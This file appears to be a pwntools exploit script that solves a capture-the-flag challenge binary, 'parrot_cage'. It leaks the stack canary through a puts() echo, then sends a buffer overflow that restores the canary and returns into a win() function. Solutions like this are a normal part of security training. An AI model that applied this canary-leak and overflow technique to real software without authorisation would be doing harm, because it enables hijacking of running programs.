#!/usr/bin/env python3
from pwn import *

exe = ELF("./parrot_cage", checksec=False)
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# buf @ rbp-0x50, canary @ rbp-0x08  →  0x50 - 0x08 = 72
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88   # canary (8) + saved RBP (8)
GADGET           = 0x000000000040101a

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    r.recvuntil(b"bye' when you're done chatting.\n")
    r.recv(timeout=0.2)

    # ── round 1: leak canary via puts() echo ─────────────────────────────────
    # Overwriting the canary's null byte causes puts() to print past it,
    # leaking the 7 remaining canary bytes. Missing bytes are null by definition.
    r.send(b'A' * (OFFSET_TO_CANARY + 1))

    leaked       = r.recvline(drop=True)
    canary_bytes = leaked[OFFSET_TO_CANARY + 1:].ljust(7, b'\x00')[:7]
    canary       = u64(b'\x00' + canary_bytes)
    log.success(f'canary = {canary:#x}')

    # ── round 2: overflow with restored canary → win() ───────────────────────
    payload = flat(
        b'A' * OFFSET_TO_CANARY,
        p64(canary),
        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.sendline(b'bye')
    r.interactive()

if __name__ == '__main__':
    main()
